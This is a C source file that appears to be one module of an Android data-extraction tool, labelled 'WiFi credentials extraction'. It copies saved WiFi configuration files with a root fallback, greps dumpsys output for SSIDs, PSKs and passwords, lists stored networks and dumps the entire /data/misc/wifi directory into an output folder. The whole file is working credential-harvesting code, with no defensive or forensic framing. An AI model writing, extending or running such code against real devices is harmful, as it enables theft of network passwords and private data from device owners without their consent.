// engine_05_wifi.c - WiFi credentials extraction
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH], buf[65536], cmd[MAX_PATH * 2];
    snprintf(res, sizeof(res), "%s/wifi", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_05.json", outdir); json_start(jsonname);
    int count = 0;
    // Config files
    const char *wifi_paths[] = {
        "/data/misc/wifi/WifiConfigStore.xml",
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/misc/wifi/softmac.conf",
        "/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
        "/data/vendor/wifi/wpa/wpa_supplicant.conf",
        "/data/misc/wifi/WifiConfigStoreSoftAp.xml",
        "/persist/wifi_mac",
        NULL
    };
    for (int i = 0; wifi_paths[i]; i++) {
        char dst[MAX_PATH]; const char *l = strrchr(wifi_paths[i], '/'); l = l ? l + 1 : wifi_paths[i];
        snprintf(dst, sizeof(dst), "%s/%s", res, l);
        save_with_root_fallback(wifi_paths[i], dst);
        if (file_exists(dst) && file_size(dst) > 10) count++;
    }
    // dumpsys
    snprintf(cmd, sizeof(cmd), "dumpsys wifi 2>/dev/null | grep -iE '(ssid|psk|password|network|bssid)' | head -500 || true");
    run_cmd(cmd, buf, sizeof(buf)); if (strlen(buf) > 10) { write_file_with_name(res, "dumpsys_wifi_creds.txt", buf); count++; }
    // settings
    snprintf(cmd, sizeof(cmd), "settings list global 2>/dev/null | grep -i wifi | head -200 || true");
    run_cmd(cmd, buf, sizeof(buf)); if (strlen(buf) > 10) { write_file_with_name(res, "settings_wifi.txt", buf); count++; }
    // cmd wifi
    snprintf(cmd, sizeof(cmd), "cmd wifi list-networks 2>/dev/null || true");
    run_cmd(cmd, buf, sizeof(buf)); if (strlen(buf) > 10) { write_file_with_name(res, "cmd_wifi_networks.txt", buf); count++; }
    // /data/misc/wifi/* full dump
    DIR *d = opendir("/data/misc/wifi"); if (d) {
        struct dirent *e; char sp[MAX_PATH];
        while ((e = readdir(d)) != NULL) {
            if (e->d_name[0] == '.') continue;
            snprintf(sp, sizeof(sp), "/data/misc/wifi/%s", e->d_name);
            char dst[MAX_PATH]; snprintf(dst, sizeof(dst), "%s/%s", res, e->d_name);
            if (copy_file(sp, dst) == 0 && file_size(dst) > 0) count++;
        } closedir(d);
    }
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"wifi\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
